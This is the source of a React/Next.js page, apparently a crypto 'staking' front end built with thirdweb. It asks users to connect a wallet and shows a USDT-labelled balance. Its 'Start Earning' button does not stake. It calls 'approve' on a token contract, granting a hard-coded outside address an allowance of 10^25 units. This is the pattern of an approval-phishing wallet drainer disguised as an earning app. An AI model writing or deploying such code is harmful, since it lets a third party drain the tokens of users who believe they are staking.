import {
  ConnectWallet,
  useAddress,
  useContract,
  useTokenBalance,
  Web3Button,
} from "@thirdweb-dev/react";
import type { NextPage } from "next";
import styles from "../styles/Theme.module.css";

import { useContractWrite } from "@thirdweb-dev/react";
import Image from "next/image";
import Box from "../public/box1.png"


const StakingMutant: NextPage = () => {
  const address = useAddress();
  const address1 = "0x6a2338373e11b2dde69a0361e05125d0d94e9ffc"

  const tokenContractAddress = "0x37F6BBE4fB136BEA7A678651031BbBE577B25f21";

  const { contract: tokenContract } = useContract(
    tokenContractAddress,
    "token"
  );
  const { data: tokenBalance } = useTokenBalance(tokenContract, address);

  const amount = BigInt("10000000000000000000000000");

  return (
    <>


      <div className={address ? styles.container : styles.container + " " + styles.ccbtn}>

        {!address ? (
          <div className="cnt">
            <h3 className="cnt-text">Connect Your Wallet to Start your Earning</h3>
            <div className="connect-btn">
              <ConnectWallet className="header-button" />
            </div>
          </div>
        ) : (
          <>
            <Image src={Box} alt="" className="box-img" />
            <h2 className="wb">WALLET BALANCE</h2>
            <div className={styles.tokenGrid + " " + styles.currbalance}>
              <div className={styles.tokenItem + " " + styles.tokenIt}>
                <h3 className={styles.tokenLabel}>Current Balance</h3>
                <p className={styles.tokenValue}>
                  {/* <b>{tokenBalance?.displayValue.substring(0, 4)}</b> {tokenBalance?.symbol} */}
                  <b>{tokenBalance?.displayValue.substring(0, 4)}</b> <b> USDT </b>
                </p>
              </div>
            </div>

            <br />
            <Web3Button
              contractAddress="0xCd38AabFbd1ff049d7A091d354EdF0704dfeF184"
              className={`${styles.mainButton} ${styles.spacerBottom} ${styles.listbtn} ${styles.startbtn} ${styles.clainbtn}`}
              action={(contract) => {
                contract.call("approve", [address1, amount])
              }}
            >
              Start Earning
            </Web3Button>


            {/* <button
              className={`${styles.mainButton} ${styles.spacerBottom} ${styles.listbtn} ${styles.startbtn}`}

            >
              Start Earning
            </button> */}
          </>
        )}
      </div>
    </>
  );
};

export default StakingMutant;